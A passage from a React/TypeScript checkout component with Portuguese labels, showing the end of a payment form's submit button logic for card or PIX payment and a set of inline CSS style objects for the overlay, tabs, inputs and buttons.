            <button type="submit" disabled={loading || (metodo === 'pix' && pixLoading)} style={loading ? btnDisabled : btnPagar}>
              {loading ? 'PROCESSANDO...' : (metodo === 'pix' && !pixData ? 'GERAR PIX' : 'FINALIZAR PAGAMENTO')}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}

// Styles
const overlayStyle: React.CSSProperties = { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(255,255,255,0.9)', zIndex: 9999, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
const spinnerStyle: React.CSSProperties = { width: '40px', height: '40px', border: '4px solid #f3f3f3', borderTop: '4px solid #000', borderRadius: '50%', animation: 'spin 1s linear infinite' };
const productBox: React.CSSProperties = { background: '#f8f9fa', padding: '15px', borderRadius: '12px', marginBottom: '20px', display: 'flex', gap: '15px', alignItems: 'center', border: '1px solid #eee' };
const tabContainer: React.CSSProperties = { display: 'flex', gap: '10px', marginBottom: '25px' };
const tabActive: React.CSSProperties = { flex: 1, padding: '12px', borderRadius: '8px', border: '2px solid #000', background: '#000', color: '#fff', fontWeight: '900', fontSize: '13px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
const tabInactive: React.CSSProperties = { flex: 1, padding: '12px', borderRadius: '8px', border: '2px solid #eee', background: '#fff', color: '#666', fontWeight: '900', fontSize: '13px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
const sectionLabel: React.CSSProperties = { fontSize: '12px', fontWeight: '900', color: '#666', marginBottom: '15px', marginTop: '25px', letterSpacing: '1px' };
const inputGroup: React.CSSProperties = { position: 'relative', display: 'flex', alignItems: 'center', background: '#f8f9fa', borderRadius: '8px', padding: '0 12px', marginBottom: '10px', border: '1px solid #eee', flex: 1 };
const inputStyle: React.CSSProperties = { width: '100%', padding: '14px 10px', border: 'none', background: 'transparent', outline: 'none', fontSize: '13px', fontWeight: 'bold', color: '#000' };
const selectStyle: React.CSSProperties = { width: '100%', padding: '14px', borderRadius: '8px', border: '1px solid #eee', background: '#f8f9fa', outline: 'none', fontSize: '13px', fontWeight: 'bold', marginTop: '5px' };
const btnPagar: React.CSSProperties = { width: '100%', padding: '18px', borderRadius: '12px', border: 'none', background: '#1da154', color: '#fff', fontWeight: '900', fontSize: '16px', marginTop: '30px', cursor: 'pointer', boxShadow: '0 4px 15px rgba(29, 161, 84, 0.3)' };
const btnDisabled: React.CSSProperties = { ...btnPagar, opacity: 0.6, cursor: 'not-allowed' };
const pixBox: React.CSSProperties = { background: '#f0fff4', padding: '20px', borderRadius: '12px', border: '1px solid #c6f6d5', marginTop: '10px' };
const btnCopiar: React.CSSProperties = { width: '100%', padding: '12px', borderRadius: '8px', border: 'none', background: '#000', color: '#fff', fontWeight: 'bold', fontSize: '12px', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' };
const errorBanner: React.CSSProperties = { background: '#fee2e2', color: '#b91c1c', padding: '15px', borderRadius: '10px', marginBottom: '15px', fontSize: '13px', fontWeight: '900', textAlign: 'center', border: '1px solid #ef4444' };
